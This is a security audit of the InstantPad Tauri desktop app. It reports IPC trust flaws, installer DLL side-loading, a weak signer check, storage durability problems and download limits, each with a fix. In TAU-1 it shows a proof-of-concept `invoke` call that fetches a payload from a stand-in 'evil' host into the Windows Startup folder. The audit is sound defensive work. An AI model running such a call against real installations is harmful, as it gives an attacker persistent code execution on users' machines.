# InstantPad audit: Tauri shell, platform, storage, catalog

Scope: `apps/desktop/src-tauri/`, `crates/platform/`, `crates/storage/`, `crates/catalog/` (HEAD `32f0af9`).
I read the code only. I did not build it. Where a finding depends on a use case in `crates/application`, I traced the call there and cite the line.

Severity scale: critical / high / medium / low / info.

---

## Summary table

| ID | Sev | Where | One line |
|----|-----|-------|----------|
| TAU-1 | high | commands/browser.rs:199-238 -> application/library.rs:49-62,88-95 -> catalog/lib.rs:104-116 | The webview sends `SoundSource.path` and `sound_url`, and the backend trusts both. That gives it a way to download any URL to any path and to copy any file anywhere. |
| PLT-1 | high | platform/windows/installer.rs:192-201,231-247 | Only the setup .exe is checked. The whole zip is unpacked into user-writable %TEMP% next to it and then run elevated, so DLL side-loading defeats the signature check. Also TOCTOU, and the folder is never cleaned up. |
| PLT-2 | medium | platform/windows/vb_audio.rs:74-78, signature.rs:191-197 | The signer check is a substring `contains("cn=burel vincent")` on the full X.500 string. |
| TAU-2 | medium | commands/training.rs:369-373, voice.rs:133-139, board.rs (all sync), setup.rs:83-87 | Sync commands run on the main thread and do heavy disk work: removing several GB of training tools, deleting models, a JSON write on every edit, and process waits. |
| STO-1 | medium | storage/json_file.rs:44-53 | Any read error (not only NotFound) counts as a first run, and the next save overwrites the real file with defaults. |
| STO-2 | medium | storage/sound_store.rs:200-213 | An import with the same file name overwrites a stored sound used by other pads. The self-copy guard is a case-insensitive string compare. |
| CAT-1 | medium | catalog/lib.rs:75-83,104-116 | Downloads have no host or scheme check, no size cap, no content-type check, and follow redirects (https to http too). A mid-stream failure leaves `.N.part` files in `sounds/` forever. |
| STO-3 | low-med | storage/json_file.rs:56-63 | The atomic write has no fsync, so a power loss can leave an empty or zeroed file. |
| TAU-3 | low-med | src-tauri/src/lib.rs:195, catalog/lib.rs:35 | A setup error or panic crashes the app at start with no message (windows_subsystem). |
| TAU-4 | low | updater.rs:60-66 | The progress callback emits an IPC event for every chunk (thousands). The `as u8` can wrap. |
| TAU-5 | low | updater.rs:28-31 | `is_portable` looks for "portable" anywhere in the full exe path. |
| TAU-6 | low | commands/updates.rs:7-11, application/updates.rs:75-83 | `restart_now` always calls `shut_down()`. A failed apply loses the downloaded update. |
| TAU-7 | low | src-tauri/src/lib.rs:122-155 | Three endless polling threads. Meters emit at 30 Hz even when hidden or unchanged. |
| TAU-8 | info/low | capabilities/default.json, tauri.conf.json | Capabilities and CSP are good overall. `core:default` is broader than needed, the app commands are not scoped, and the CSP has no `base-uri`/`form-action`. |
| PLT-3 | low | signature.rs:200-226 | WinVerifyTrust uses the default revocation flags (WTD_REVOKE_NONE) and parses the file again on its own. |
| PLT-4 | low | signature.rs:256-268 | Reads `CMSG_SIGNER_INFO` from a buffer without checking its size. |
| PLT-5 | low | shell.rs:47-73, installer.rs:204-207 | The elevated setup's exit code is ignored, so a cancelled setup still reports success. No lpDirectory, and HRESULTs are printed as decimal. |
| PLT-6 | low | installer.rs:210-228,239 | No size caps: page, zip and extraction (zip bomb) are all unbounded. |
| PLT-7 | low | shell.rs:22-43, endpoints.rs:106-108 | The `open()` refusal mapping is wrong and its result is discarded (dead code). |
| PLT-8 | low | linux/system_audio.rs:17-19, linux/pulse_cable.rs:54-90 | `settings://sound` is not a standard scheme and blocks the main thread. The PulseCable `Drop` never runs (dead code). A half-made cable is never repaired. pactl runs synchronously during setup. |
| STO-4 | low | sound_store.rs:200-219, json_file.rs | Blocking `std::fs::copy` and JSON I/O on tokio workers. |
| STO-5 | low | sound_store.rs:165-169, domain/sounds.rs:36 | `file_name_of` keeps the query string. `safe_file_name` lets through `.`, `..`, empty names and Windows device names. Different URLs with the same last segment collide. |
| STO-6 | low | json_file.rs, data_folder.rs | Default permissions (0644 on Linux) for voices.json, which holds the voiceprint. `INSTANTPAD_DATA` is honoured in release builds. |
| CAT-2 | low | catalog/parser.rs:288 | The `has_more` substring check gives false positives (`page=2` matches `page=20`). |
| CAT-3 | low | catalog/lib.rs:33,66-71 | The 30 s total timeout includes the body. The HTML body has no size cap. |
| TAU-9 | low | hotkeys.rs:241,253,261 | `expect("hotkey lock poisoned")` in the global-shortcut handler. |

---

## Tauri shell (`apps/desktop/src-tauri`)

### TAU-1 (high): the IPC trusts file paths and URLs that the webview chooses

- `commands/browser.rs:199-238`: `preview_sound`, `play_in_game`, `add_to_pad`, `toggle_favorite` and `save_to_computer` all deserialize a full `SoundSource { name, color, path, sound_url }` from the webview (`domain/src/sounds.rs:11-18`).
- `application/src/library.rs:49-62` (`ensure_downloaded`): `if !exists(source.path) { … self.catalog.download(url, &source.path) }`. That writes the body of **any URL** to **any path the webview names**. Line 60 does the same through `keep_preview(&preview, &source.path)` (a rename to any path).
- `application/src/library.rs:88-95` (`save_to_computer`): `files.export(&source.path, destination)` is `std::fs::copy(any_path, any_path)` (`storage/sound_store.rs:215-219`).
- `application/src/favorites.rs:40` sends the same untrusted source through `ensure_downloaded`.
- `catalog/lib.rs:104-116` checks nothing about the URL (see CAT-1).

Why it matters: in Tauri's model the webview is the less-trusted side. Any script that runs in it (an XSS from scraped catalog names, a compromised npm dependency in the bundle, or a future change that loads remote content) gets this:

```js
invoke("add_to_pad", { source: { name:"x", color:"#000",
  path:"C:\\Users\\me\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.cmd",
  soundUrl:"https://evil/payload" }, slot:null })
```

That is persistent code execution. `save_to_computer` gives arbitrary file read and copy. Today the CSP (`script-src` falls back to `'self'`) and React's escaping make XSS unlikely; I found no `dangerouslySetInnerHTML` or `eval` in `src/`. So this is defence in depth, but the primitive is as strong as they come.

Fix: never take a filesystem path from the webview for catalog sounds.
- Derive the path in the backend with `files.path_for_download(sound_url)`.
- Validate `sound_url`: it must be `https`, the host must be `www.myinstants.com`, and the path must start with `/media/sounds/`. Do this in `MyInstantsCatalog::download` too.
- For favorites and imported sounds, look them up by URL or an opaque id in the backend's own list rather than using the client's `path`.
- `save_to_computer` should only export files under `sounds/` or `previews/`, resolved by the backend.

The same reasoning applies, more weakly, to `import_files`, `import_clone_sample`, `import_training_take` and `add_trained_model` (read any path). Those are acceptable because they come from the open dialog. Still, consider a backend-side dialog (`tauri_plugin_dialog` from Rust) so the path never crosses the IPC boundary.

### TAU-2 (medium): blocking work on the main (UI) thread

In Tauri 2, a `#[tauri::command] fn` that is not `async` runs inline in the IPC handler, on the main thread. Checked in `tauri-macros-2.7.4/src/command/wrapper.rs:398` (`body_blocking`). Many sync commands do disk or process work:

- `commands/training.rs:369-373` `remove_training_tools` calls `KitTrainer::remove_tools` (`training/src/lib.rs:609-627`). That is `fs::remove_dir_all` on a Python/PyTorch install of **2.7 GB to 8.9 GB** (`training/src/pins.rs:65-82`), followed by `tools_on_disk(&self.home)` (lib.rs:468), which walks the remaining tree. The window freezes for seconds to minutes ("Not responding" on Windows).
- `commands/voice.rs:133-139` `delete_cloned_voice` deletes trained model files (`voice-ai/src/lib.rs:132`) and possibly a training's recordings.
- Every board edit (`rename_pad`, `set_pad_color`, `set_pad_volume`, `swap_pads`, `remove_pad`, `send_to_interface`, …) goes through `after_board_edit`, then `save()`, which serializes the whole board and writes the JSON on the main thread (`application/src/board.rs:114-118,653-656`). That is small but synchronous disk I/O on the UI thread, plus an fsync-less rename (STO-3).
- `setup.rs:83-87` `open_sound_settings`: on Linux/macOS it uses `Command::status()`, which waits for `xdg-open`/`open` (`platform/src/linux/system_audio.rs:17-19`, `macos/system_audio.rs:22-26`).
- `commands/updates.rs:7-11` `restart_now`: `update.install(bytes)` extracts or replaces the bundle synchronously. That one is acceptable because the app is restarting.
- `commands/app.rs:20` `start`: `board.start` saves the board on the main thread, at every reload.

Fix: make these commands `async` (or `#[tauri::command(async)]`) and wrap heavy filesystem work in `tauri::async_runtime::spawn_blocking`. `remove_tools` in particular should run in the background and publish progress or completion through the existing events.

### TAU-3 (low-medium): a startup failure is a silent crash

- `src/lib.rs:195`: `.build(tauri::generate_context!()).expect("build the app")`. Every error from `setup` lands here: `composition::build` turns `AppDataFolder::resolve` I/O errors into `tauri::Error` with `?` (`composition.rs:86-87`). With `windows_subsystem = "windows"` (`main.rs:2`) there is no console, so the user sees the app fail to open with no message.
- `catalog/lib.rs:31-35`: `Client::builder()…build().expect(…)` runs inside `composition::build` (`composition.rs:96`). A failure to initialise native-tls or OpenSSL (for example a broken OpenSSL on Linux) panics during setup.
- `platform/src/lib.rs:78` with `linux/pulse_cable.rs:57-81`: setup runs `pactl` up to three times synchronously before the window shows. If the Pulse or PipeWire server is wedged, `pactl` can hang and so does startup.

Fix:
- Catch the setup error in `run()` and show a native message box (`rfd`, or `tauri_plugin_dialog`'s blocking message) before exiting with a code.
- Make `MyInstantsCatalog::new` return a `Result`, or fall back to a default client.
- Create the Pulse cable lazily, or on a thread, with a timeout.

### TAU-4 (low): update progress floods the IPC

`updater.rs:60-66`: `report` runs for every body chunk (about 8-16 KB from reqwest). Each call builds a `Message` and emits an `AppEvent::Update` (`application/updates.rs:55-64`) even when the percent has not changed. A 30-60 MB installer means thousands of serialized events to the webview. Also, `(received * 100 / total) as u8` wraps if the server's Content-Length is smaller than the body.

Fix: keep `last_percent` and emit only when it changes. Use `.min(100)` before the cast (or `u8::try_from(..).unwrap_or(100)`).

### TAU-5 (low): the portable check is too broad

`updater.rs:28-31` checks whether `current_exe().to_string_lossy().to_lowercase()` contains "portable". An install under `D:\PortableApps\…` or a user named `portable…` silently turns updates off. ADR 0002 says the file *name* is what decides.

Fix: compare `current_exe().file_name()` only, for example `== "InstantPad-portable.exe"` ignoring case.

### TAU-6 (low): `restart_now` side effects

`commands/updates.rs:7-11` calls `core.shut_down()` unconditionally (it stops the training and clears previews), then `updates.restart_now()`. That is a no-op if `is_ready` is false, for example on a double-click or if the frontend gets the state wrong.

In `application/updates.rs:77` `is_ready.swap(false)` runs before `apply`, and `updater.rs:77-82` `take()`s the bytes. If `install` fails, the update is gone until the next app start and the training has already been stopped.

Fix: call `shut_down` only when an update is ready, and put the bytes back (or keep them) on failure.

### TAU-7 (low): polling threads

`src/lib.rs:122-155` starts three `loop { …; sleep }` threads that never end:
- the meters at 33 ms, which emit a serialized `MeterFrame` and take the board lock twice per tick, whether or not the window is visible and whether or not anything changed;
- `voice.learn` every 500 ms;
- `watch_devices` every 500 ms.

They are harmless at exit, since the process ends. But a panic inside one (all the `expect("… lock poisoned")`) silently stops meters, learning or device recovery for the rest of the session.

Fix:
- Skip the emit when the frame equals the last one or the window is minimized.
- Consider event-driven wakeups (a channel from the audio callback) instead of the 500 ms polls.
- Wrap each loop body in `catch_unwind`, or at least log.

### TAU-8 (info/low): capabilities, CSP and config

What is good here:
- `capabilities/default.json` is minimal: window drag/min/close/fullscreen, `dialog:allow-open|save|message`.
- No fs, shell or http plugin. No asset protocol. `withGlobalTauri` is off.
- The CSP is `default-src 'self'`, there is no `unsafe-eval`, and `connect-src` is limited to IPC.
- Updater: minisign pubkey set, HTTPS GitHub endpoint, passive Windows mode.
- `tauri-plugin-updater-2.14.1` verifies the signature inside `download()` (`src/updater.rs:902`) before the bytes reach `install`.

Minor gaps:
- `core:default` pulls in every core default set (app, path, event, image, menu, tray, resources, webview incl. `allow-internal-toggle-devtools`). Listing only `core:event:default`, `core:window:default` and the explicit window permissions is tighter.
- The app's own 85 commands are not scoped by an app manifest (`build.rs` is plain `tauri_build::build()`), so any webview window can call all of them. That is fine with one local window, but worth pinning with `tauri_build::Attributes::app_manifest` if more windows appear.
- The CSP could add `base-uri 'none'; form-action 'none'; object-src 'none'; frame-ancestors 'none'`. `base-uri` and `form-action` do not fall back to `default-src`.

### TAU-9 (low): `expect` on a poisoned lock in the hotkey handler

`hotkeys.rs:241,253,261`. This only matters if something panics while holding the lock, and today nothing does. If it ever happens, every later key press panics in the main-thread shortcut handler. Use `lock().unwrap_or_else(PoisonError::into_inner)`; the map is always consistent.

Also: there is no std Mutex held across an `.await` anywhere in src-tauri. In `updater.rs` the guards are temporaries dropped before each await. Good.

---

## Platform (`crates/platform`)

### PLT-1 (high): VB-CABLE install — the signature check covers one file, but an elevated process runs from a folder of unchecked, user-writable files

`windows/installer.rs`:
- 231-247: `archive.extract(&folder)` unpacks **every entry** of the downloaded zip into `%TEMP%\InstantPad-VBCABLE-<uuid>`, which is writable by the user.
- 197: `signature::verify(&setup)` checks only `VBCABLE_Setup_x64.exe`.
- 201: `shell::run_elevated(&setup)` uses `runas`.

Problems:
1. **DLL side-loading.** An elevated exe looks in its own folder first for DLLs that are not KnownDLLs (`version.dll`, `dwmapi.dll`, `uxtheme.dll`, `cryptbase.dll`, …) unless it hardens itself with `SetDefaultDllDirectories`. I have not checked VB-Audio's binary, but most installers do not harden this. Two ways in:
   - A tampered pack, which is exactly the case the signature check exists for (`signature.rs:1`: "a tampered download must never reach it"), can ship a malicious DLL next to the genuine signed exe. The DLL then runs as admin, and the UAC prompt even shows the trusted VB-Audio publisher.
   - Any same-user process can drop a DLL into the folder between extraction and elevation. That is a UAC bypass that SECURITY.md lists as in scope.
2. **TOCTOU.** The file is opened by path three separate times: WinVerifyTrust (`signature.rs:200-226`, `hFile` unset), `read_signer` (`CryptQueryObject` by path), and `ShellExecuteExW`. A same-user process can swap the exe between the check and the run.
3. **No cleanup.** The extracted folder is never removed. Every attempt leaves the pack in %TEMP%.

Fix, in order of value:
- **Pin the pack.** Use a SHA-256 table of known driver-pack versions, as the macOS pkg already does for BlackHole (`macos/blackhole/postinstall:8`). Refuse anything else, or fall back to the pinned URL plus hash.
- **Allowlist the archive entries.** Accept only the expected names and extensions (`.exe`, `.inf`, `.sys`, `.cat`, `.txt`, `.pdf`), refuse any `.dll`, and unpack only those.
- **Harden the folder and the file.** Extract into a folder whose DACL denies write to the user after extraction, or copy to a location only admins can write. Open the exe with `FILE_SHARE_READ` only (no write or delete sharing), pass that handle as `WINTRUST_FILE_INFO.hFile`, and keep it open until `ShellExecuteExW` returns.
- Remove the folder after the setup exits (`remove_dir_all`, ignoring errors).

### PLT-2 (medium): the signer check matches a substring

`vb_audio.rs:74-78`: `subject.to_ascii_lowercase().contains("cn=burel vincent")` runs on the `CertNameToStrW(CERT_X500_NAME_STR)` output (`signature.rs:294-313`). All of these are accepted:
- `CN=BUREL VINCENTE`
- `CN=Burel Vincent Holdings Ltd`
- any subject with a quoted RDN value holding the text, for example `OU="CN=BUREL VINCENT", CN=Mallory`. CertNameToStr quotes values that contain `=` or `,`, and the quoted text still contains the needle.

The test at line 160 covers only one negative case. An attacker still needs a Windows-trusted code-signing certificate, but a cheap individual or OV certificate in a near-identical name is realistic.

Fix:
- Get the CN on its own with `CertGetNameStringW(cert, CERT_NAME_ATTR_TYPE, 0, szOID_COMMON_NAME)` and compare it for equality, ignoring ASCII case.
- Better: also pin the issuer CN, or the leaf certificate's SPKI or thumbprint set, and the signing EKU.
- Add tests for the prefix and quoted-OU cases.

### PLT-3 (low): WinVerifyTrust settings

`signature.rs:207-213`:
- `fdwRevocationChecks` is left at 0 (`WTD_REVOKE_NONE`) and `dwProvFlags` at 0. Whether revocation is checked then depends on machine policy. For a binary about to run elevated, ask for `WTD_REVOKE_WHOLECHAIN` explicitly (and accept failing closed when offline, or show a clear message).
- The signer is pulled out by parsing the file again (`CryptQueryObject`) rather than from the verified state. Use `WTD_STATEACTION_VERIFY`, then `WTHelperProvDataFromStateData`, `WTHelperGetProvSignerFromChain` and `pasCertChain[0]`, then `WTD_STATEACTION_CLOSE`. That way the subject you check is the one WinTrust verified, and with PLT-1's handle there is one open.

The current code is correct in what it does: state action IGNORE needs no close, and `status == 0` is the right success test.

### PLT-4 (low): the signer-info buffer size is not checked

`signature.rs:256-268`: after `CryptMsgGetParam(.., None, &mut size)`, `buffer` holds `ceil(size/8)` u64s, and then `&*buffer.as_ptr().cast::<CMSG_SIGNER_INFO>()` is dereferenced. If the API ever returned a `size` smaller than `size_of::<CMSG_SIGNER_INFO>()` (including 0), this reads out of bounds, which is UB. The API is not expected to do that, but the `unsafe` block should not depend on it. Add `if (size as usize) < size_of::<CMSG_SIGNER_INFO>() { return None; }`.

The rest of the unsafe code is sound:
- The u64 buffer is aligned.
- The `Issuer` and `SerialNumber` blobs point into `buffer`, which outlives `CertFindCertificateInStore`.
- `Handles` closes the store and message exactly once, and only after success.
- The certificate context is freed.
- `CertNameToStrW` gets the length it asked for, and the trailing NUL is trimmed.

### PLT-5 (low): `run_elevated` ignores how the setup ended

`shell.rs:65-72` waits on `hProcess`, then returns `Ok(())` without calling `GetExitCodeProcess`. As a result, `installer_step::install_cable` returns `DONE` and the NSIS hook sets the reboot flag and the RunOnce key (`windows/hooks.nsh:175-180`), even when the user cancelled inside the VB-Audio setup.

Other points:
- There is no `lpDirectory`, so the setup inherits the app's working directory.
- COM is not initialised on the `spawn_blocking` thread, which the ShellExecuteEx docs ask for.
- `Refusal::Failed(error.code().0 as isize)` prints an HRESULT as a negative decimal (`installer.rs:206`).

Fix:
- Read the exit code, or re-run `find_game_output` after the setup closes, and report an unconfirmed install.
- Set `lpDirectory` to the extraction folder.
- Format HRESULTs as `{:#010x}`.

### PLT-6 (low): unbounded downloads in the cable installer

`installer.rs:210-228`: the product page `.text()` and the zip `.bytes().to_vec()` are read fully into memory with no limit. That also costs an extra copy: `Bytes` to `Vec`, where `Cursor<Bytes>` would do. `archive.extract` (239) has no limit on total uncompressed size, so a zip bomb can fill the disk. Zip-slip and symlink escapes **are** handled by `zip-9.1.3` (`read/extract.rs:434,578` uses `safe_prepare_path`).

Fix: check `content_length()` against a cap (for example 20 MB for the pack and 2 MB for the page), stream with a counter, and sum `ZipFile::size()` before extracting. This matters less once the pack is pinned (PLT-1).

### PLT-7 (low): the `shell::open` refusal mapping is meaningless

`shell.rs:22-43`: with the `open` verb, `SE_ERR_ACCESSDENIED (5)` is not "the user declined elevation". The only caller, `endpoints.rs:106-108`, discards the result anyway. Return `bool` or `io::Result`, or log it, and drop the mapping.

The COM handling in `endpoints.rs` is correct:
- `ComScope` balances `CoInitializeEx` when it returns S_OK or S_FALSE (`.is_ok()` covers both).
- It skips `CoUninitialize` on `RPC_E_CHANGED_MODE`.
- The COM interfaces are dropped (end of the `unsafe` block) before `_com`.
- `GetId` is freed with `CoTaskMemFree`.

### PLT-8 (low): Linux cable and settings

- `linux/system_audio.rs:17-19`: `xdg-open settings://sound` is not a scheme that GNOME, KDE or XFCE register, so the Sound settings button probably does nothing on Linux. `.status()` also blocks the main thread (TAU-2). Try `gnome-control-center sound`, `systemsettings kcm_pulseaudio` or `pavucontrol` in turn, and `spawn()` rather than `status()`.
- `pulse_cable.rs:84-90`: `impl Drop for PulseCable` and the `modules` field are dead. `platform/src/lib.rs:70-71` itself says Tauri never drops the cable, and the design is to keep it between runs. Remove them, or document them as test-only.
- `pulse_cable.rs:59`: `sinks.contains("InstantPad")` is a substring test on the whole listing. If a previous run loaded the null sink but the remap source failed (or was unloaded), the source never comes back. Check for both `InstantPad` and `InstantPad_Mic` by exact name (`pactl list short sources`) and load whichever is missing.
- No shell-injection risk: `Command::new("pactl").args(..)` with constant arguments. Good.

macOS: `blackhole.rs:38-46` and `system_audio.rs:22-26` run `/usr/bin/open` with an absolute path and fixed URLs. `.status()` inside an async fn blocks a tokio worker briefly (low). The `.pkg` postinstall pins the version and SHA-256, cleans up its temp folder, and lets `installer` check the vendor signature. Good.

---

## Storage (`crates/storage`)

### STO-1 (medium): a failed read becomes the defaults, and the next save destroys the data

`json_file.rs:44-47`: `let Ok(bytes) = std::fs::read(path) else { return T::default(); };`. Every I/O error is treated as "first run", not only `NotFound`: EACCES, EIO, a Windows sharing violation from antivirus or a backup tool holding the file, an OneDrive placeholder that is not available. The app then runs with an empty board, settings, voices or favorites. The first save (for example `board.start` → `save()`, `application/board.rs:95`, on every start) atomically **replaces the real file with the defaults**. The `.bak` safety net only covers parse errors.

Fix: match `Err(e) if e.kind() == NotFound => default`. For any other error, copy to `.bak` when possible and return a failure or a "read-only" flag that stops saves, or retry briefly.

### STO-2 (medium): name collisions on import, and a weak self-copy guard

`sound_store.rs:200-213`:
- The destination is `sounds/<file name>` with no de-duplication. Importing `D:\a\boom.mp3` after `C:\b\boom.mp3` overwrites the stored file that existing pads (and favorites) still point to. Those pads silently start playing the new sound, or the engine plays a stale decoded copy. `board.import_files` (`application/board.rs:430-451`) does not check this either.
- The guard `destination_text.eq_ignore_ascii_case(source_path)` is a string compare. It is wrong on case-sensitive filesystems and misses aliases (`/` vs `\`, `..`, symlinks, 8.3 names, `\\?\`). On Unix, `std::fs::copy(x, x)` opens the destination with `O_TRUNC` and destroys the file.

Fix: give imports unique names (`stem-<shorthash>.ext`, or a content hash so the same file de-duplicates). Detect same-file by comparing `fs::canonicalize` results, or by file identity (`same-file` crate), not by string.

### STO-3 (low-medium): the atomic write is not durable

`json_file.rs:56-63`: `fs::write(part)` then `rename`, with no `sync_all` on the file and none on the parent directory. A process crash is covered, as the comment says. A power loss or BSOD on NTFS, XFS or btrfs (and ext4 without `auto_da_alloc`) can leave the target empty or zeroed after the rename.

Other points:
- The fixed `.part` name is only safe because every caller holds its state lock while saving. I checked board, settings, voice library, favorites and training. That is a hidden invariant.
- `load` overwrites any earlier `.bak` (line 50), so a second corruption destroys the first backup.
- On Windows, `rename` fails with ACCESS_DENIED when antivirus or the indexer has the target open.

Fix:
- `File::create` → `write_all` → `sync_all` → `rename` → (Unix) fsync the directory.
- Use a unique temp name (`tempfile::NamedTempFile::persist` does all of this).
- Retry the rename a few times on Windows, or use `ReplaceFileW`.
- Timestamp the `.bak`.

### STO-4 (low): blocking filesystem calls on async threads

`import`, `export` and `keep_preview` (`sound_store.rs:185-219`) are synchronous `std::fs::copy`/`rename` on user files of any size. They are called from async use cases on tokio workers (`import_files`, `save_to_computer`, `cut` imports). JSON saves happen there too. Wrap the copies in `spawn_blocking`, or move the port to async.

### STO-5 (low): file-name derivation

- `file_name_of` (`sound_store.rs:166-169`) takes the last `/` segment of the full URL, including any `?query`/`#frag`. `a.mp3?v=2` becomes `a.mp3_v=2`, which loses the extension the decoder may rely on.
- Different URLs with the same last segment (or differing only in case, on Windows and macOS) share one file.
- `safe_file_name` (`domain/sounds.rs:36-46`) passes `.`, `..`, empty strings, trailing dots and spaces, and Windows device names (`CON`, `NUL`, `COM1`, `AUX.mp3` on Windows 10). `..` or an empty name points the target at a directory, so the download's rename fails. I found no escape, but the errors are confusing.

Fix: parse the URL, use `path_segments().last()`, reject empty, `.` and `..`, map reserved names, and add a short hash of the full URL.

### STO-6 (low): file permissions and environment override

- `voices.json` holds the user's voiceprint (`repositories.rs:303`). On Linux it is created with the process umask (often 0644). Use 0600 for `voices.json` and `training.json`, and 0700 for the data root.
- `data_folder.rs:107-112`: `INSTANTPAD_DATA` is honoured in release builds as well. That is fine as a feature, but `#[cfg(debug_assertions)]` matches the doc comment ("development runs").

---

## Catalog (`crates/catalog`)

### CAT-1 (medium): the downloader has no limits

`lib.rs:75-83,104-116`:
- No check of the URL's scheme or host (see TAU-1). Any http(s) URL is fetched, including `http://127.0.0.1:…` or LAN addresses, which is a GET-only SSRF.
- reqwest's default redirect policy follows up to 10 redirects, including `https` to `http` downgrades. Add `.https_only(true)` and a custom redirect policy limited to the myinstants hosts.
- No cap on body size, so a hostile or broken server can fill the disk. Check the `content_length` and stream with a counter, for example 25 MB.
- No content-type or magic check before the file becomes a "sound".
- **The partial file leaks on failure**: `save` creates `{destination}.{n}.part` and returns on the first `?`. `download` maps the error but never removes the partial. Mid-transfer failures (a timeout, a reset) leave junk in `sounds/` forever, because `clear_previews` only cleans `previews/`. The test `a_failed_download_says_why` only covers an error *before* `File::create`. Fix: on error, `let _ = fs::remove_file(&partial).await;`.

Streaming chunks to disk and the per-download unique `.part` name are good choices.

### CAT-2 (low): `has_more` can be wrong

`parser.rs:288`: `html.contains(&format!("page={}", page + 1))`. On page 1, any `page=2X` link counts, and on page 2 any `page=3X`. Match `page=N` followed by a non-digit (with a regex or a check of the next byte).

### CAT-3 (low): timeouts and body size

`lib.rs:33`: `.timeout(30s)` is a total deadline that includes the body, so a large sound on a slow link always fails at 30 s. Use `connect_timeout` plus `read_timeout`, as `platform/windows/installer.rs:179-182` already does. `fetch_page` `.text()` (66-71) reads an unbounded body.

ReDoS: none. `regex` 1.x guarantees linear-time matching with no backtracking, and the bounded `{0,400}?` is compiled once in a `LazyLock`. Entity decoding uses `html_escape`, and names are shown as text by React. The trending region is limited to two ASCII letters plus an allowlist (`domain/trending.rs:15-38`), so there is no path injection into the URL.

Info: `BROWSER_USER_AGENT` claims to be Chrome 130 while scraping a site with no API. That is a terms-of-service and robustness consideration, not a code defect.

---

## Rust quality notes (all low)

- `unwrap`/`expect` outside tests:
  - `lib.rs:195` (TAU-3)
  - `catalog/lib.rs:35` (TAU-3)
  - `hotkeys.rs:241,253,261` (TAU-9)
  - `updater.rs:50,55,72,80` (poison only)
  - `parser.rs:266` (constant regex, fine)
- Lossy casts:
  - `updater.rs:64` `as u8` can wrap (TAU-4)
  - `shell.rs:62` HRESULT as `isize` (cosmetic)
  - The remaining `size_of::<…>() as u32` and `volume as f32` are fine.
- Dead code:
  - the PulseCable `Drop` and `modules` (PLT-8)
  - the `shell::open` refusal mapping (PLT-7)
  - `AppDataFolder::new` is used only by `resolve` and the tests.
- Errors: the IPC handlers return `Result<(), ()>` and report failures through events. That is consistent and documented (commands/mod.rs:1). Some detail is lost:
  - updater `map_err(|_| UpdateDownloadFailed)` drops the cause in both download and install (`updater.rs:70,89`). Use `Failure::because(…, error)` as the other adapters do.
  - `find_update` swallows every error (`updater.rs:48`) on purpose. Fine, but no log at all makes problems in the field hard to diagnose. A `log`/`tracing` sink is missing in the whole shell.
- I saw almost no AI slop. Comments explain *why* (for example `installer.rs:186`, `json_file.rs:42-43`, `lib.rs:179`). The commands are uniformly thin. There are no needless abstraction layers and no large clones in commands. A few comments restate the code ("Only fails while the window is closing" appears twice: `lib.rs:126`, `events.rs:21`), which is harmless.

## What is done well

- A tight Tauri surface: a minimal capability list, no fs/shell/http plugins, no asset protocol, a strict script CSP, and IPC-only `connect-src`.
- Updates are minisign-signed over HTTPS, applied only on restart or exit, and portable builds opt out. Signature verification happens in the plugin before install (verified in its source).
- The single-instance plugin is registered first, before devices and hotkeys are touched.
- The installer step needs least privilege: the NSIS install is per-user, and only the VB-Audio setup elevates, through `runas` after a WinTrust check and a vendor-subject check (both need hardening: PLT-1, PLT-2).
- The `unsafe` code has `SAFETY` comments that are accurate. It uses RAII for the crypt handles and COM apartments, and correctly handles S_FALSE versus RPC_E_CHANGED_MODE. `unsafe` is allowed only in `platform::windows`.
- The macOS BlackHole pkg pins both the version and the SHA-256.
- JSON documents use write-and-rename plus a `.bak` copy of damaged files. `#[serde(default)]` lets old files keep loading. Storage tests cover most of this.
- `FolderSoundStore::delete` refuses to delete outside `sounds/`.
- Catalog downloads stream to a unique `.part` file and rename into place. The regex parser cannot backtrack catastrophically. Query parameters are encoded by reqwest (tested).
- `pactl` is called with fixed argument vectors, never through a shell.
- No std `Mutex` guard is held across `.await` in the shell.
